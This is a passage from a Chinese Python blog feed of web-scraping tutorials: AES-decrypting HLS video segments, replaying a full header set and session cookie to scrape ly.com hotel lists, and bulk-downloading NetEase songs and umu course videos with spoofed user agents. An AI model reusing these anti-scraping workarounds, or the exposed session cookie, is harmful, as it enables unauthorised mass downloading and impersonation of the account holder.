class="token punctuation">)</span> <span class="token comment"># 拿到key的内容</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已获取到key'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key_res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key_res<span class="token punctuation">.</span>content<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> <span class="token string">b'0000000000000000'</span><span class="token punctuation">)</span>  <span class="token comment"># 制作解密文件</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已成功制作解密文件'</span><span class="token punctuation">)</span>    <span class="token comment"># 拿视频碎片</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'(filesequence\d+.ts)'</span><span class="token punctuation">)</span>    filesequences_list<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    count <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment"># 计数、缓解等待压力</span>    <span class="token keyword">for</span> filesequence <span class="token keyword">in</span> filesequences_list<span class="token punctuation">:</span>        filesequence_url <span class="token operator">=</span> path <span class="token operator">+</span> filesequence        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>filesequence_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token comment"># 图片内容需要以二进制wb读写。</span>        video <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">.mp4'</span></span><span class="token punctuation">,</span><span class="token string">'ab+'</span><span class="token punctuation">)</span>        <span class="token comment"># 获取pic的二进制内容</span>        video<span class="token punctuation">.</span>write<span class="token punctuation">(</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment"># 关闭文件</span>        video<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[下载进度]:{}{:.2f}%"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token operator">*</span>count<span class="token punctuation">,</span>count<span class="token operator">/</span><span class="token builtin">len</span><span class="token punctuation">(</span>filesequences_list<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十二、新遇到的一点反爬问题"><a href="#十二、新遇到的一点反爬问题" class="headerlink" title="十二、新遇到的一点反爬问题"></a>十二、新遇到的一点反爬问题</h2><p>最近爬这个网站遇到一点问题，<a href="https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1693794571107&amp;city=321&amp;inDate=2023-09-04&amp;outDate=2023-09-05&amp;filterList=8888_1">https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1693794571107&amp;city=321&amp;inDate=2023-09-04&amp;outDate=2023-09-05&amp;filterList=8888_1</a></p><p>以前可以爬，现在不能爬，经过研究，发现是网站开发者增加了对请求头字段的校验。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders_str <span class="token operator">=</span> <span class="token triple-quoted-string string">'''accept: application/json, text/plain, */*Accept-Encoding: gzip, deflate, braccept-language: zh-cnappfrom: 16cluster: idcConnection: keep-aliveCookie: soso_17u_tab_open_index=1; H5CookieId=2a31035b-81b0-452f-8af5-4bc2cb6d6229; firsttime=1693790207090; abtkey=037eed29-b152-4fc3-92a8-027faa2dffc6; _tcudid_v2=GVAglBHWXx1wFDh4_P4gvwe79p_DO7Vf2Yj7sQ9vCd4; nus=userid=682242716&amp;nickName=%e5%90%8c%e7%a8%8b%e4%bc%9a%e5%91%98_0D043E7512A&amp;level=1; __tctma=144323752.1693790169808694.1693790169437.1693790169437.1693793067529.2; hotel_lang=zh-cn; 17uCNRefId=RefId=0&amp;SEFrom=&amp;SEKeyWords=; TicketSEInfo=RefId=0&amp;SEFrom=&amp;SEKeyWords=; CNSEInfo=RefId=0&amp;tcbdkeyid=&amp;SEFrom=&amp;SEKeyWords=&amp;RefUrl=; qdid=-9999; businessLine=hotel; H5Channel=mnoreferseo%2CSEO; indate=2023-09-09; outdate=2023-09-10; route=e83eaebd8f07fc1b8cfab528aeb2900e; lasttime=1694239332948; JSESSIONID=A23D8BD953AE131A1233B6F406759B2Edeviceid: 2a31035b-81b0-452f-8af5-4bc2cb6d6229Host: www.ly.comReferer: https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1694239332807&amp;city=321&amp;inDate=2023-09-09&amp;outDate=2023-09-10&amp;filterList=8888_1sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Sec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-origintimezone: 8tmapi-client: tpctraceid: d6d36af2-7f3a-4504-a125-db1cfa470c97User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'''</span>headers_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>line_list <span class="token operator">=</span> headers_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> line_list<span class="token punctuation">:</span>    key <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    value <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    headers_dict<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># print(headers_dict)</span>url <span class="token operator">=</span> <span class="token string">'https://www.ly.com/tapi/v2/list?pageSize=20&amp;t=1694239311116&amp;city=321&amp;inDate=2023-09-09&amp;outDate=2023-09-10&amp;filterList=8888_1&amp;pageIndex=0&amp;sugActInfo='</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers_dict<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>hotel_list <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'hotelList'</span><span class="token punctuation">]</span><span class="token keyword">for</span> hotel <span class="token keyword">in</span> hotel_list<span class="token punctuation">:</span>    hotelName <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'hotelName'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hotelName<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫4—网易云歌曲爬虫</title>
      <link href="/2022/03/21/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB4%E2%80%94%E7%BD%91%E6%98%93%E4%BA%91%E6%AD%8C%E6%9B%B2%E7%88%AC%E8%99%AB/"/>
      <url>/2022/03/21/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB4%E2%80%94%E7%BD%91%E6%98%93%E4%BA%91%E6%AD%8C%E6%9B%B2%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token punctuation">,</span>re<span class="token punctuation">,</span>os<span class="token punctuation">,</span>time<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">downloader</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----下载器----#</span>    size<span class="token operator">=</span><span class="token number">0</span> <span class="token comment">#定义已下载文件的大小（byte）</span>    chunk_size<span class="token operator">=</span><span class="token number">1024</span> <span class="token comment">#定义每次下载的数据大小（byte）</span>    root<span class="token operator">=</span><span class="token string">'./蔡徐坤动听音乐/'</span>    path<span class="token operator">=</span>root<span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'.mp3'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 如果文件夹不存在，则创建文件夹</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>            content_size<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'content-length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[文件大小]：%0.2f MB'</span><span class="token operator">%</span><span class="token punctuation">(</span>content_size<span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将byte换算成MB</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"利神超极速爬虫器正在疯狂下载！！！"</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    <span class="token keyword">for</span> data <span class="token keyword">in</span> res<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span>chunk_size<span class="token operator">=</span>chunk_size<span class="token punctuation">)</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                        size<span class="token operator">+=</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[下载进度]:{}{:.2f}%"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>size<span class="token operator">*</span><span class="token number">50</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>size<span class="token operator">*</span><span class="token number">100</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'\n下载成功,文件自动保存在当前目录</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件已存在'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'爬取失败'</span><span class="token punctuation">)</span><span class="token comment"># 伪装请求头</span>user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span><span class="token punctuation">]</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment"># 爬取歌手页</span>url <span class="token operator">=</span> <span class="token string">'https://music.163.com/artist?id=12932368'</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment">#用正则表达式提取id和歌曲名，&lt;a href="/song?id=1360512113"&gt;记得&lt;/a&gt;</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;a href="/song\?id=(\d+)"&gt;.*?&lt;/a&gt;'</span><span class="token punctuation">)</span>ids<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;a href="/song\?id=\d+"&gt;(.*?)&lt;/a&gt;'</span><span class="token punctuation">)</span>names<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># 批量下载歌曲</span><span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span>name <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>ids<span class="token punctuation">,</span>names<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'https://music.163.com/song/media/outer/url?id=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>    downloader<span class="token punctuation">(</span>url<span class="token punctuation">,</span>name<span class="token punctuation">)</span>    <span class="token comment"># res=requests.get(url,headers=headers)</span>    <span class="token comment"># file = open(f'{name}.mp3','wb')</span>    <span class="token comment"># file.write(res.content)</span>    <span class="token comment"># file.close()</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'爬虫完毕，不要问谁开发的，深藏功与名，按任意键退出'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫3—爬取umn网站的所有视频</title>
      <link href="/2022/03/20/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB3%E2%80%94%E7%88%AC%E5%8F%96umn%E7%BD%91%E7%AB%99%E7%9A%84%E6%89%80%E6%9C%89%E8%A7%86%E9%A2%91/"/>
      <url>/2022/03/20/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB3%E2%80%94%E7%88%AC%E5%8F%96umn%E7%BD%91%E7%AB%99%E7%9A%84%E6%89%80%E6%9C%89%E8%A7%86%E9%A2%91/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网站分析"><a href="#一、网站分析" class="headerlink" title="一、网站分析"></a>一、网站分析</h2><p>打开课程详情页，目标是爬取所有的教学视频。<br>在详情页抓包，可以得到前三个视频的链接后缀。<br>第一个视频：1581601804.0237.24958.6125399.mp4<br>第二个视频：1581605929.0875.63457.6129383.mp4<br>第三个视频：1581605996.445.72069.6126469.mp4<br>那这个后缀怎么得到呢，首页的源代码里面是没有的，只能抓包看看，果然发现一个很萌的东西，因为开发者为了让首页加载出封面的图片，而这个图片又是直接从视频截取的，然后顺理成章的，网站开发者为了图方便省事，直接就用了和视频一样的url，只是后缀换成了jpg而已。<br>既然这样就很简单了，渲染出整个页面的数据，然后取出视频的后缀，拼接一下就行了，代码如下。</p><h2 id="二、完整代码"><a href="#二、完整代码" class="headerlink" title="二、完整代码"></a>二、完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#2.1版本公告：从程序目录启动谷歌浏览器驱动</span><span class="token comment">#2.0版本公告：下载内容从网站动态获得</span><span class="token comment">#1.3版本公告：显示已找到多少个资源</span><span class="token comment">#1.2版本公告：加入了文本进度条显示</span><span class="token comment">#1.1版本公告：新增自动创建文件夹功能，文件检索功能，文件已存在时不会重复下载</span><span class="token comment">#umn一键视频爬取器1.0版本介绍：用于爬取umn教学平台上的的教学视频</span><span class="token keyword">import</span> time<span class="token keyword">import</span> pyautogui<span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options<span class="token keyword">def</span> <span class="token function">video_url_get</span><span class="token punctuation">(</span>url_course<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----获取视频的url----#</span>    video_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment">#----设置浏览器静默模式（已停用，否则无法下滑鼠标）----#</span>    chrome_options<span class="token operator">=</span>Options<span class="token punctuation">(</span><span class="token punctuation">)</span>    chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span>    diver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">'chromedriver.exe'</span><span class="token punctuation">)</span>    <span class="token comment">#----访问到首页----#  </span>    diver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_course<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment">#----鼠标往下滑两次----#</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pyautogui<span class="token punctuation">.</span>scroll<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10000</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment">#----获取整个页面的数据，提取出视频后缀----#</span>    Pagesource<span class="token operator">=</span>diver<span class="token punctuation">.</span>page_source    video_tails<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'(\d*\.\d*\.\d*.{0,10}).mp4'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>Pagesource<span class="token punctuation">)</span>    diver<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> video_tail <span class="token keyword">in</span> video_tails<span class="token punctuation">:</span>        video_url<span class="token operator">=</span><span class="token string">'https://statics0.umustatic.cn/videoweike/teacher/weike/4kXW2806/transcoding/'</span><span class="token operator">+</span>video_tail<span class="token operator">+</span><span class="token string">'.mp4'</span>        video_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>video_url<span class="token punctuation">)</span>    <span class="token keyword">return</span> video_list<span class="token keyword">def</span> <span class="token function">downloader</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----下载器----#</span>    start<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    size<span class="token operator">=</span><span class="token number">0</span> <span class="token comment">#定义已下载文件的大小（byte）</span>    chunk_size<span class="token operator">=</span><span class="token number">1024</span> <span class="token comment">#定义每次下载的数据大小（byte）</span>    root<span class="token operator">=</span><span class="token string">'d://umn_spider_video//'</span>    path<span class="token operator">=</span>root<span class="token operator">+</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>            content_size<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'content-length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[文件大小]：%0.2f MB'</span><span class="token operator">%</span><span class="token punctuation">(</span>content_size<span class="token operator">/</span><span class="token number">1024</span><span class="token operator">/</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将byte换算成MB</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"急速爬虫器正在疯狂下载！！！"</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    <span class="token keyword">for</span> data <span class="token keyword">in</span> res<span class="token punctuation">.</span>iter_content<span class="token punctuation">(</span>chunk_size<span class="token operator">=</span>chunk_size<span class="token punctuation">)</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                        size<span class="token operator">+=</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[下载进度]:{}{:.2f}%"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>size<span class="token operator">*</span><span class="token number">50</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>size<span class="token operator">*</span><span class="token number">100</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n下载成功,文件自动帮您保存在d:/umn_spider_video/'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件已存在'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'爬取失败'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    url_course<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入课程首页的网址，如果不清楚请看教程：'</span><span class="token punctuation">)</span>    <span class="token comment"># url_course='https://m.umu.cn/course/?groupId=4138993&amp;sKey=0e6490a0d5ef477593326d2e8cd53faa&amp;from_type=myparticipate'#专业教学设计与案例分析</span>    <span class="token comment"># url_course='https://m.umu.cn/course/?groupId=5001078&amp;sKey=e30c05f1c34302d77478bf49a21daec2&amp;from_type=myparticipate'  #职业教育德育研究</span>    video_list<span class="token operator">=</span>video_url_get<span class="token punctuation">(</span>url_course<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已找到资源共%d个'</span><span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>video_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> url <span class="token keyword">in</span> video_list<span class="token punctuation">:</span>        downloader<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'任务全部完成，欢迎您的再次使用，按任意键退出。'</span><span class="token punctuation">)</span><span aria-hidden="true" 